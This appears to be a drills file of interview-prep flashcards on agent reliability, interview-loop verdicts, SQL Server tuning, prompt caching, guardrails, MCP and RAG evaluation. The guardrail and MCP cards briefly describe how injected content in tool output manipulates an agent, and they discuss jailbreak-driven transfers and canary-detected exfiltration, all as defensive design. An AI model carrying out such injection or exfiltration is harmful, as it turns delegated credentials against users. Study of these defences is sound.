drills.q: You're asked: 'what's the worst this agent can do, and what's your revocation story?' Give the four-number frame.
drills.a: (1) Blast radius of full compromise: which credentials, which tenants, which irreversibilities â€” can it send, spend, delete, merge? (2) Time-to-revoke: dispatcher kill switch plus per-session short-TTL credentials â€” seconds, not a support ticket. (3) Detection latency: canary alarms on outbound args, egress allowlist violations, action-sequence anomaly rules. (4) Audit reconstruction: immutable per-call logs (tool, args, tier, approver, trace id) answering 'what did it do and why' from traces. Air Canada established the agent's actions are the company's actions â€” these four numbers are the compliance answer too.

drills.q: A guard-model classifier blocks 95% of a known attack corpus. What's the correct interpretation of that number for a design review?
drills.a: Good hygiene against known patterns, not a safety guarantee â€” an attacker optimizing against your specific classifier will target the remaining gap, and the classifier is one probabilistic layer, not the architectural fix; the real safety property still comes from removing a trifecta leg.

drills.q: When is it reasonable to skip heavy sandboxing and permission engineering for an agent?
drills.a: When the agent has no lethal trifecta in its actual capability set â€” e.g. read-only access to public data with no write tools and no external-communication path â€” heavy defense is cost and latency against a threat model that doesn't apply.

drills.q: Name the four things that change between a demo loop and a production loop.
drills.a: Budget enforcement (client-only to shared/server-side), failure recovery (restart to resume-from-checkpoint), cancellation (Ctrl-C to cooperative flag at safe boundaries), and output (blocking response to multi-granularity streaming).

drills.q: Your run is scaled across 4 workers and each independently checks a $1.00 budget object before spending. Actual spend hits $3.80. What happened and what's the fix?
drills.a: Time-of-check-to-time-of-use: each worker's in-process budget check saw headroom independently, so multiple workers spent against the same logical cap. Fix: a shared, atomically-updated ledger (Redis/Postgres) as the actual enforcement point, with reservation (debit max-possible before the call, credit back after) rather than plain check-then-spend.

drills.q: A 10-step agent runs at 85% per-step reliability. What's the uncheckpointed completion rate, and what exactly does adding checkpointing change about that number?
drills.a: 0.85^10 ~= 20%. Checkpointing does not raise this number -- it doesn't make any step more reliable. It lowers the COST of a failure: a failure now resumes from the last durable checkpoint instead of restarting from step zero, so a failure at step 7 loses one step's work instead of seven.

drills.q: Where should a checkpoint be taken relative to a tool call, and why not right before the tool executes?
drills.a: After the tool result is durably recorded, before the next model call. A crash mid-model-call then safely resumes by re-issuing a request that hasn't happened. Checkpointing before execution wouldn't help the hard case anyway -- a crash mid-execution can leave the side effect done with no recorded result, which only an idempotency key on the tool (not checkpoint placement) can fix.

drills.q: Why is an agent kill switch cooperative instead of preemptive?
drills.a: You can't forcibly interrupt an in-flight tool call without risking a half-completed side effect (e.g. a send-email call that completes after the kill but before your code records it). The flag is checked at safe boundaries between steps; a slow tool must accept and check its own cancellation token internally, since the harness can't reach inside a black-box call.

drills.q: What is a hard kill, when do you escalate to it, and why is it not correctness-safe by itself?
drills.a: Terminating the worker process outright (SIGKILL-equivalent), used after soft kill fails to resolve within a grace period (mirroring SIGTERM-then-SIGKILL, ~30s typical). It's not correctness-safe because it can leave a tool call executed with no recorded result -- recovery requires every mutating tool to have an idempotency key so the next attempt can check 'did this already happen' rather than repeat it.

drills.q: A run shows status 'cancelled' in your DB but tool-side logs show activity 30 seconds later. Diagnose.
drills.a: The kill-flag check interval is too coarse -- likely checked once per full loop iteration while a single tool call inside that iteration runs long (e.g. 90s). The gap between 'flag set' and 'worker checks flag' is exactly the observed lag; fix by checking at finer-grained boundaries (between model call and tool execution, and inside long tool calls via a cancellation token).

drills.q: Name the three streaming granularities for a production agent UI and what each one is for.
drills.a: Token (raw model deltas, fixes perceived latency during generation), step (harness-synthesized tool-call status events, fixes silence during tool execution), event (budget/checkpoint/compaction state, fixes transparency and debuggability).

drills.q: Users report a 5-tool-call agent turn as 'hung' even though it finished correctly in 25 seconds. Why, and what's the fix?
drills.a: Tool execution produces no text tokens, so a token-only streaming client sees pure silence for the whole 25 seconds. Fix: emit step-level events ('using tool: X') during tool execution -- harness-side, zero cost at the model layer.

drills.q: A model turn returns 3 parallel tool_use blocks; one tool fails. What do you send back, and what happens if you omit the failed one?
drills.a: A tool_result for all three, including is_error: true for the failed one -- never omit it. Omitting it leaves a tool_use with no matching tool_result, which the API rejects on the next request (every tool_use id needs exactly one paired tool_result).

drills.q: Retries against a recovering upstream are making its recovery slower. What's missing, and does respecting retry-after alone fix it?
drills.a: A fleet-level retry budget and jitter. Respecting retry-after alone doesn't fix it because every worker honoring the same value retries in sync, hitting the recovering service in one wave. Add full jitter on top, plus cap aggregate retries at a fraction of total request volume across the fleet.

drills.q: Why do you alert on p99 step count and cost per run rather than the mean?
drills.a: Step-count distributions are commonly bimodal: most runs finish fast, and a tail hits the step cap. A mean blends the tail into the fast majority and hides the runaway population entirely; p99 surfaces it.

drills.q: When would you deliberately NOT build durable checkpointing, a distributed kill switch, and a shared budget ledger?
drills.a: For short, synchronous, single-user tasks finishing in a few seconds -- a step cap and deadline suffice and the full apparatus is overhead. Also skip building it if the org already has a workflow engine (Temporal/Step Functions) that already provides checkpointing and durable retries, or if a managed agent platform already runs the loop server-side with these built in.

drills.q: State the five-round order of a full loop and one reason for the order.
drills.a: Coding, Design, AI Depth, Behavioral, HM Grill -- coding first because it's most mechanically graded before fatigue; behavioral fourth deliberately, to test if STAR discipline survives the technical gauntlet; HM grill last, mirroring how real onsites close.

drills.q: Is the overall committee verdict an average of the five round scores?
drills.a: No -- it's a judgment call weighted by whether the weakest round, on its own, indicates a gap serious enough to sink the hire for the specific role, not an arithmetic mean.

drills.q: A candidate scores STRONG HIRE on design and NO HIRE on the coding round's mechanism-explanation moments. What should the committee do?
drills.a: Treat this contradiction as worse than uniformly middling scores -- re-examine the strong design round's evidence more skeptically, since the pattern suggests it may have been rehearsed rather than reflecting real depth, rather than just averaging around the weak round.

drills.q: 4 rounds show senior-level structure, 1 round shows a genuine staff-level unprompted tradeoff. What's the honest level read?
drills.a: Senior with staff potential -- not staff. Resist rounding up to the single best data point; the level read comes from the pattern across 3+ rounds.

drills.q: List the four required elements of a committee verdict.
drills.a: Overall recommendation (not an average), the round that would have sunk it (named even in a HIRE), the level read with evidence and the gap to the next level, and ONE fix (the highest-leverage common thread, not five separate items).

drills.q: A candidate is strong and detailed in round 1 but by round 4-5 stops naming rejected alternatives or admitting uncertainty. What does this pattern indicate, and why is it worse than simple fatigue?
drills.a: Front-loading -- the strong material was likely rehearsed and ran out, rather than genuine depth simply tiring. Genuine understanding doesn't have a fixed supply that depletes after one round.

drills.q: Why is it evasive for a candidate to say 'I already covered this in the design round' during the behavioral round, even if literally true?
drills.a: Real interviewers in a real loop have not seen each other's rounds -- deflecting to an earlier round instead of answering the current question directly reads as evasive regardless of intent.

drills.q: One round scores STRONG NO HIRE (0-4/20) but the other four are STRONG HIRE. Is this automatically overridden by the other four?
drills.a: No -- a real committee treats a single STRONG NO HIRE round as a serious signal that is not automatically overridable by strong performance elsewhere.

drills.q: Same headline metric is described with a holdout-based measurement method in the behavioral round and a pre/post method in the HM grill. What does the consistency check flag, and what's the implication?
drills.a: A real discrepancy, not cosmetic phrasing drift -- flagged as a consistency-check failure, which is treated as worse than a single weak round because it suggests a story was materially reshaped between rounds rather than reframed.

drills.q: Why does a LEAN HIRE on the role's core-skill round (e.g. GenAI depth for a GenAI-heavy role) outweigh a STRONG HIRE on a less-central round?
drills.a: The committee verdict weights the weakest round by its relevance to the actual day-to-day job, not just its raw score -- a gap in the core skill is a bigger risk than excellence in a peripheral one.

drills.q: Why should the debrief never be skipped after a long 4-hour loop?
drills.a: Roughly half the module's diagnostic value lives in the debrief's cross-round consistency check and level-read reasoning -- skipping it means only collecting five isolated scores instead of the harder, more useful cross-round pattern.

drills.q: Why does a wide or volatile clustering key bloat every nonclustered index on a table, not just the clustered index?
drills.a: Every nonclustered index leaf entry stores the clustering key value as its row locator (not a physical pointer), so the clustering key is duplicated across every nonclustered index on the table. A wide key means every one of those indexes is correspondingly larger.

drills.q: What is a key lookup, and how do you eliminate it without changing the query text?
drills.a: A second seek into the clustered index to fetch columns not carried by the nonclustered index used for the seek. Eliminate it by adding those columns to the nonclustered index as INCLUDE columns, making it a covering index and enabling an index-only path.

drills.q: A stored procedure has been fast for six months and is suddenly slow for one customer, no code changes. Diagnose it.
drills.a: Check sys.dm_exec_query_stats for the cached plan's min/max elapsed time spread, then sys.dm_exec_query_plan for estimated vs actual row counts on the current slow execution. A large gap right after the predicate on the sniffed parameter confirms parameter sniffing; a uniform gap across all values instead points to stale statistics.

drills.q: Compare OPTION(RECOMPILE) and OPTIMIZE FOR UNKNOWN as parameter-sniffing fixes, including when each is wrong.
drills.a: RECOMPILE compiles a fresh, exactly-correct plan on every call - correct for infrequent expensive queries, wrong at high QPS due to per-call compile cost. OPTIMIZE FOR UNKNOWN compiles once using average density stats, cached and cheap, but is mediocre for both very sparse and very dense parameter values rather than optimal for any of them.

drills.q: What does SQL Server 2022's Parameter Sensitive Plan optimization do differently from prior fixes, and what's its limitation?
drills.a: It caches multiple plans per query text, bucketed by which cardinality range the sniffed equality-predicate parameter falls into, approaching per-value-optimal plans without RECOMPILE's per-call cost. It requires compatibility level 160+ and only targets equality-predicate skew, not range predicates or multi-parameter interactions.

drills.q: How is SQL Server's default READ COMMITTED different from Postgres's, and what's the operational consequence?
drills.a: SQL Server's default READ COMMITTED is lock-based (shared locks on reads, exclusive on writes held to commit) - readers and writers block each other. Postgres's is MVCC-based from the start with no reader-writer blocking. An engineer moving between the two is surprised the first time a SQL Server report query blocks production writes.

drills.q: What does RCSI change, and what's the hidden cost teams forget to plan for?
drills.a: READ_COMMITTED_SNAPSHOT ON switches reads to row versioning instead of locking, eliminating reader/writer blocking. Hidden cost: every old row version touched by an in-flight reader gets copied into the tempdb version store, so a write-heavy workload can turn tempdb into a new I/O and contention bottleneck if not pre-sized and striped.

drills.q: Why is upgrading database compatibility level a real risk on an old, heavily-tuned database?
drills.a: SQL Server 2014's cardinality estimator (compat level >=120) makes different cross-predicate correlation assumptions than the legacy CE (compat <=110). Flipping compat level changes row estimates feeding every plan decision at once, which can silently regress plans that were implicitly tuned around the legacy CE's specific biases even while improving others on average.

drills.q: Why does column-wise storage plus batch mode make columnstore aggregations so much faster than rowstore?
drills.a: Column-wise compressed storage means a query touching a subset of columns only reads those columns' segments, versus rowstore reading every column of every row. Batch mode processes ~900 rows per operator call instead of 1, amortizing per-row CPU overhead - commonly cited as another 2-4x on top of the storage and compression wins.

drills.q: What is segment elimination, and why would a columnstore index show none of it despite filtering on an indexed column?
drills.a: Segment elimination uses each segment's per-column min/max metadata to skip segments that can't satisfy a predicate, without decompressing them. It shows no benefit if the data isn't physically ordered relative to the filtered column - a randomly-inserted timestamp gives every segment a similar min/max range. Fix: rebuild with MAXDOP=1 for an ordered build, or REORGANIZE periodically.

drills.q: When is a clustered columnstore index the wrong choice, and what's the alternative for a mixed OLTP/analytics table?
drills.a: Wrong for tables needing frequent singleton point lookups or small frequent updates - the delta-store mechanism buffering small inserts before compression adds overhead there. Alternative: keep the rowstore clustered index for OLTP and add a nonclustered columnstore index (NCCI) alongside it for the analytical access pattern - the 'operational analytics' pattern.

drills.q: A columnstore-backed fact table's insert rate has degraded over time. What's the likely cause and fix?
drills.a: Background compression (the tuple mover) is falling behind insert volume, leaving too many uncompressed delta-store rowgroups - the SQL Server shape of ClickHouse's 'too many parts' problem. Fix: batch inserts into larger, less frequent operations, or manually run ALTER INDEX ... REORGANIZE to force the tuple mover to catch up.

drills.q: Give the write and read cost multipliers for prompt caching at the 5-minute TTL.
drills.a: Write: 1.25x standard input price. Read: roughly 0.1x (90% discount).

drills.q: How many cache hits does it take to break even at the 5-minute TTL versus the 1-hour TTL?
drills.a: 5-minute TTL: 1 hit (1.25+0.1=1.35 vs 2x uncached). 1-hour TTL: 3 hits (2+0.2=2.2 vs 3x uncached) -- the higher write cost needs more reads to amortize.

drills.q: cache_read_input_tokens is zero across ten requests with what looks like an identical prompt. What do you check first?
drills.a: A silent invalidator: a timestamp or UUID interpolated into the system prompt, non-deterministic JSON key ordering, or a tool list that reorders between calls. Diff the actual rendered prompt bytes between two requests rather than assuming the cache_control marker is misplaced.

drills.q: A 3K-token prompt caches on one model but not on another with no error. Why?
drills.a: Minimum cacheable prefix length differs by model generation and is not monotonic (roughly 512 to 4,096 tokens across generations). Below the minimum, caching silently fails -- usage.cache_creation_input_tokens shows 0, no error is raised.

drills.q: How do you set the boundary for routing between a cheap and expensive model?
drills.a: Empirically: collect a labeled sample of real production traffic, get quality judgments for both models on it, fit a classifier or threshold predicting whether the cheap model matches the expensive one, and validate on a held-out set. Not intuition, not prompt length alone.

drills.q: Give RouteLLM's published cost/quality result.
drills.a: Over 85% cost reduction on MT-Bench while retaining 95% of the stronger model's judged quality, sending only 14% of queries to the expensive model in the best-tuned configuration.

drills.q: You upgraded the expensive model in your routing pair but kept the old threshold. What breaks?
drills.a: The threshold was calibrated against the OLD quality gap between the two models, not an absolute difficulty scale. An upgrade shifts that gap, so the stale threshold either overspends (routing too much to the now-stronger model unnecessarily) or underspends quality (leaving traffic that needs the upgrade on the cheap model). You must recalibrate, not assume transfer.

drills.q: Distinguish model routing from a fallback chain in one sentence each, and say why they get conflated.
drills.a: Routing: predictive, decides where a request SHOULD go based on evaluated difficulty. Fallback: reactive, decides where a request goes AFTER a 429/5xx/refusal. Conflated because 'try cheap, escalate on suspicion' looks like fallback syntax but is really an uncalibrated router that also inherits fallback's double-round-trip latency cost.

drills.q: Why are fallback chains an availability tool rather than a cost tool?
drills.a: Every fallback firing costs the latency of the failed attempt plus the successful one -- a chain of three targets can cost three sequential round trips in the worst case. That latency cost is the point of a resilience mechanism (survive an outage), not a cost-saving one; using it purely to save money hides an unpriced latency cost.

drills.q: What is the Batch API discount and its constraint, and how does it compound with caching?
drills.a: 50% off input and output on every model, with up to 24-hour turnaround (unsuitable for latency-sensitive work). It compounds with caching as an independent discount: a batch job over a cached corpus can land near 5% of the naive rate for the cached-and-batched portion (50% batch x ~10% cache read).

drills.q: A tenant is 'within budget' on your dashboard but you got paged for a cost spike anyway. What's missing?
drills.a: Rate-of-change alerting. Cumulative-spend-only dashboards miss a tenant whose spend has doubled week-over-week but hasn't yet crossed the absolute cap -- that trend is the leading indicator a rate alert catches before the budget is actually blown.

drills.q: During an incident, 'which feature caused this spend spike' takes 40 minutes to answer from logs. What should have been in place?
drills.a: Request-time tagging: every request tagged with a feature/workflow identifier AT THE POINT OF THE CALL, so attribution is a query against tagged data rather than a reconstruction from untagged logs after the fact.

drills.q: What is a guardrail, and what four verbs does every one perform?
drills.a: Deterministic validation and policy enforcement wrapped around a nondeterministic model. Verbs: classify (topic, PII, jailbreak), verify (schema, facts), transform (redact, mask, pseudonymize), route (pass, block, fix, escalate). Libraries are prebuilt validators; the engineering is placement, cost, and failure policy per risk.

drills.q: Order the three validator families by cost and state when you'd use each.
drills.a: Deterministic (regex, schema, checksum, canary): sub-ms, in-process, for well-formed guarantees like JSON conformance, banned domains, Luhn-validated card numbers. Statistical (Presidio: pattern + context + NER): ~50-300 ms, for format-variance in PII with tunable thresholds. Model-based (Llama Guard, omni-moderation): hundreds of ms, one forward pass per message, for semantics: novel jailbreaks, paraphrased toxicity. Never pay tier-3 cost for a tier-1 guarantee; prefilter before the classifier.

drills.q: What are NeMo Guardrails' five rail types, and what is its differentiator?
drills.a: Input, dialog, retrieval, execution, and output rails, configured in config.yml plus Colang .co flow files. Reference input flows: 'check jailbreak' and 'mask sensitive data on input'; output flows: 'self check facts' and 'self check hallucination'. The differentiator is dialog rails: Colang scripts conversation flows so fact-checking runs only for the question types that need it. Async-first, Python 3.10-3.13, release 0.23.0.

drills.q: Your PII regex misses a card number typed with unicode separators, and your statistical detector false-positives on order IDs. How do you fix both?
drills.a: Layer the families: regex for the high-precision well-formed cases with Luhn checksum validation (12-19 digits), context words near the candidate to suppress the order-ID false positive (Presidio's approach), and NER for format-variance. Accept Presidio's documented caveat that automated detection is not exhaustive, and add the real control: project columns at the tool boundary so card numbers never enter model context at all. Prevention beats detection.

drills.q: The model needs the real customer name to write a personalized email. Where do you hydrate the pseudonyms?
drills.a: Only in the final render path, after output guards run on the model text, using a per-request map keyed by token (never span index), never logged, destroyed after render. The model works from pseudonyms plus template instructions. If the model genuinely must see real values, scope the exposure to that entity type and session, and have the output guard skip that entity rather than blocking. Hydrating right after the model call puts unguarded PII in every downstream hop.

drills.q: Your moderation API has 99.9% uptime and your fail-closed jailbreak guard blocks on its errors. Worst case analysis?
drills.a: 0.1% of traffic blocked sounds small but is many users, and outages are correlated: your dependency's bad deploy hits during your peak. The fix is redundancy with DIVERGENT implementations for fail-closed risks (platform filter plus app-side prefilter), circuit-breaking to a safer degraded mode with an honest message rather than a generic 500, and guard-error rate tracked as a first-class SLO. Azure documents that its filter errors return 200 unfiltered, so fail-open paths need monitoring too.

drills.q: A canary token appears in a tool result the model constructed (a search query), not in the final answer. What do you do?
drills.a: Block, and that is the point of scanning every egress surface, not just the response: the leak already left your boundary once it reached the tool. A canary in a model-constructed search query is exfiltration-in-progress: block, alert, revoke that session's tool access. A canary in a log line you wrote yourself is your own logging bug, a different triage. The distinction is whether the flow was model-controlled.

drills.q: You run a public agent at 100 QPS and can't afford a model classifier on every message. What's the tiered design?
drills.a: Layer 0: deterministic prefilters on everything (signatures, encoding detection, known jailbreak corpora), sub-ms. Layer 1: classifier on suspicion (prefilter hits) and on risk: traffic with tool access or external effects always classified; read-only chat sampled at 10-20%, biased to new sessions. Layer 2: async scoring post-render with retraction and downstream-effect suppression on a flag. Do the arithmetic: an 8B classifier sidecar on vLLM serves hundreds of calls per second per GPU, so 'too expensive' usually means 'serialized in the hot path.'

drills.q: Design the guard architecture for a regulated fintech agent that reads accounts, moves money, and talks to customers.
drills.a: Start from the risk inventory: PII/PCI leakage, regulated advice, social engineering, jailbreak-driven transfers, hallucinated balances, audit obligations. Place guards by risk: (1) tool boundary first: money-moving tool tier-gated with approval for out-of-pattern transfers; accounts tool projects data so full card numbers never enter context. (2) Input: encoding prefilter, Presidio pseudonymization, denied-topic guard for investment advice with a licensed-advisor escalation path, jailbreak prefilter + classifier for sessions with tool access. (3) Output: schema check on tool arguments BEFORE execution (sub-ms, guards the money), PII scan pre-hydration, canary on every egress surface, groundedness on account-data claims. (4) Platform filters as baseline. (5) Failure policy: money-path guards fail closed, conversational fail open with alarms. (6) Immutable audit on regulated actions. (7) Measurement: weekly FPR on benign traffic, red-team in CI, drift monitors.

drills.q: Your red-team suite passes 100% but is six months old. Are you safe?
drills.a: No; the suite measures yesterday's attacks. Efficacy is a rate of adaptation, not a state: continuous red-teaming, canary tripwires for novel exfiltration, and above all the containment posture (tool risk tiers, least privilege) that holds when detection misses, since a jailbroken model with no refund tool cannot refund. Also report the other side: FPR on benign production traffic, because over-blocking is the failure that gets guardrails disabled. 'The suite is green' cannot terminate the safety conversation at principal level.

drills.q: A support bot's topical-restriction guardrail blocks 12% of legitimate messages in its first week. What's the likely operational failure mode if nothing changes?
drills.a: Complaint volume pressures someone to loosen the threshold in a hotfix, and the threshold is often never re-tightened once complaints stop, silently eroding the protection back toward zero.

drills.q: Give one case where adding a cheap, available guardrail layer is still the wrong call.
drills.a: When it duplicates coverage a stronger control already provides (e.g., a text-response PII filter on a system where the agent has no tool capable of leaking PII), since it only adds false-positive risk with no matching threat.

drills.q: What wire protocol underlies MCP?
drills.a: JSON-RPC 2.0 over a transport (stdio or Streamable HTTP).

drills.q: Name MCP's three primitives.
drills.a: Tools, resources, prompts.

drills.q: Which primitive is model-controlled, and which is user-controlled?
drills.a: Tools are model-controlled; prompts are user-controlled. Resources are application-controlled.

drills.q: Why was HTTP+SSE deprecated as a transport?
drills.a: It required sticky sessions to route follow-up requests to the instance holding the open SSE stream, which broke horizontal scaling and had no clean resume after a drop.

drills.q: A tool throws an exception inside your MCP server. What should the client receive, and what happens if you get it wrong?
drills.a: A tools/call result with isError:true and descriptive content. Getting it wrong (letting it surface as a JSON-RPC error) raises a client-side exception that kills the whole agent run instead of giving the model an observation to react to.

drills.q: Explain why an MCP server is described as a 'confused deputy' by construction.
drills.a: It holds its own elevated credentials to a downstream system and acts on instructions from a model that can be manipulated by injected content (prompt injection via tool/resource output), so it can be tricked into misusing its own authority on an attacker's behalf.

drills.q: What is token passthrough, why is it forbidden, and what's the fix?
drills.a: Forwarding the client's token straight to a downstream API. Forbidden (spec MUST NOT) because it breaks audit trails and leaks user tokens if the server is compromised. Fix: validate the token's audience, then use a separately held, scoped credential for the downstream call.

drills.q: What is the headline change in the 2026-07-28 MCP spec revision?
drills.a: The protocol becomes stateless: the initialize/notifications/initialized handshake and Mcp-Session-Id sessions are removed; every request carries version/capabilities in _meta.

drills.q: Roots, Sampling, and Logging were all deprecated in the same spec revision. What replaces each?
drills.a: Roots -> pass paths as tool arguments or server config. Sampling -> call your own LLM provider directly. Logging -> stderr on stdio or OpenTelemetry.

drills.q: A remote MCP server behind a round-robin load balancer starts failing intermittently as traffic scales out. Diagnose and fix.
drills.a: Pre-2026-07-28 stateful mode: Mcp-Session-Id pins a session to one instance, and round-robin breaks that. Fix today: sticky sessions or a shared session store; long-term: migrate to the stateless transport.

drills.q: When should you NOT use MCP?
drills.a: When it's one agent calling one in-process function with no other consumer -- the protocol adds schema validation, serialization, and a subprocess/network round trip for no portability benefit.

drills.q: In one sentence, distinguish MCP from A2A.
drills.a: MCP connects an agent to tools and context; A2A connects agents to each other as peers with a task lifecycle -- they compose rather than compete.

drills.q: Define Recall@k and Precision@k precisely. When should a RAG system optimize primarily for one over the other?
drills.a: Recall@k = |relevant ∩ top-k|/|relevant|; Precision@k = |relevant ∩ top-k|/k. A RAG system whose generator reads the whole top-k context should optimize primarily for Recall@k -- getting the answer into context matters more than position -- with Precision@k as a secondary noise/cost concern.

drills.q: What's the difference between MRR and MAP, and when would you pick one over the other?
drills.a: MRR averages the reciprocal rank of only the first relevant result, blind to further relevant documents. MAP averages precision at every rank a relevant document appears, crediting multiple hits found early. Pick MRR for single-best-answer lookups (FAQ); pick MAP when multiple relevant documents add product value (multi-source synthesis).

drills.q: Derive nDCG and explain why you normalize by IDCG instead of using raw DCG.
drills.a: DCG@k = sum(rel_i/log2(i+1)); nDCG@k = DCG@k/IDCG@k. Raw DCG isn't comparable across queries with different numbers of relevant documents (a query with 5 relevant docs has a higher raw ceiling than one with 1), so normalizing by each query's own achievable maximum makes scores comparable across a golden set.

drills.q: What makes a golden set "not garbage," concretely?
drills.a: Real queries sampled from production plus deliberate edge cases, a 50+ query floor before trusting the metric to gate decisions, at least two independent annotators reconciling every label, graded relevance where the product needs it, and periodic refresh as the corpus changes.

drills.q: Explain the ceiling argument: why can't a reranker fix a recall miss? How would you prove that's what's happening?
drills.a: A reranker only reorders candidates first-stage retrieval already surfaced; if the answer-bearing chunk was never in the candidate set, there's nothing to promote. Prove it by measuring recall@k1 of the first stage in isolation against the golden set -- if the document isn't even in that set, the reranker is provably blameless.

drills.q: Why is a chunking miss easy to misdiagnose as a retrieval miss, and how do you tell them apart?
drills.a: Both produce the same symptom (LLM lacks the answer or hallucinates). Check whether the answer-bearing source document was retrieved at all, even split across chunks -- if the correct document is in the candidate set but no single chunk contains the full answer, that's a chunking miss, not a retrieval miss.

drills.q: Why is offline-online metric correlation often weak, and what's the practical consequence?
drills.a: Published research reports Pearson correlations around 0.3, not 0.8+. Golden sets are static curated snapshots that don't capture diversity, personalization, or real intent variance, and multi-stage interactions can offset component-level gains. Practically: treat an offline win as a hypothesis for an online A/B test, not a stopping point.

drills.q: Describe the error-analysis loop as a repeatable method rather than a one-time audit.
drills.a: Sample real failures, classify each by root cause (retrieval/ranking/chunking/generation miss) using the pipeline stages, fix whichever class is most common (not the loudest individual failure), then re-measure and repeat -- each pass should shift the dominant failure class.

drills.q: Your team has improved nDCG for two straight quarters but a user survey shows perceived answer quality hasn't moved. Diagnose.
drills.a: Two hypotheses to check: (1) nDCG may be the wrong metric if the generator ingests the whole top-k regardless of order -- Recall@k or a faithfulness metric may actually gate perceived quality. (2) Retrieval may be past its practical ceiling and the bottleneck shifted to chunking or generation -- run error analysis to see if generation misses now dominate. Either way, re-run error classification and consider switching the optimized metric rather than continuing to push the same number.

drills.q: What's ablation discipline and why does skipping it cause future regressions?
drills.a: When multiple changes ship in one bundle, an aggregate metric win doesn't reveal which component mattered -- some could be hurting while others mask it. Skipping isolation means a future engineer may remove what looks like a redundant piece of the bundle that was actually carrying the improvement, with no record of which piece that was.

drills.q: Why does a naive PDF text extractor fail on a two-column layout, and why is the failure dangerous?
